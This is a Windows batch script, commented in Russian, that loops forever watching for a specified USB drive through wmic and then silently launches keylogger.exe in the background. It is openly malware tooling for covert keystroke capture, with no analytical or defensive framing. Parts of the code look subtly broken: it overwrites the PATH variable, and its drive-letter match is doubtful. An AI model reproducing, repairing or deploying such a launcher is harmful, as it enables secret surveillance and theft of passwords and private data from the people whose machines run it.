@echo off
setlocal enabledelayedexpansion
set "path=%cd%"
set "watchdrive=%1:\"
set "watchfile=%path%\keylogger.exe"
rem Проверяем, существует ли файл keylogger.exe
if not exist "%watchfile%" (
    echo Файл keylogger.exe не найден
    exit /b
)
echo Начало отслеживания подключения флешки...
rem Бесконечный цикл
:loop
rem Получаем список подключенных устройств
for /f "usebackq tokens=1,2,3,4,5,6,7 delims= " %%a in (`wmic logicaldisk where "drivetype=2 and size>0" get caption^, drivetype^, size^, volumeserialnumber^, description^, filesystem^| findstr /v /r "^$"`) do (
    set "drive=%%a"
    set "type=%%b"
    set "size=%%c"
    set "serial=%%d"
    set "label=%%e"
    set "fs=%%f"
    set "desc=%%g"
    set "state=unknown"
    
    rem Проверяем, является ли устройство флешкой
    if "!drive!" == "!watchdrive!" (
        rem Запускаем keylogger.exe в фоновом режиме
        start /b "" "!watchfile!"
        echo Keylogger запущен
        set "state=running"
    )
    
    echo !drive! !type! !size! !serial! !label! !fs! !desc! !state!
)
rem Задержка, чтобы не нагружать процессор
ping -n 10 127.0.0.1 > nul
rem Переходим на следующий шаг цикла
goto loop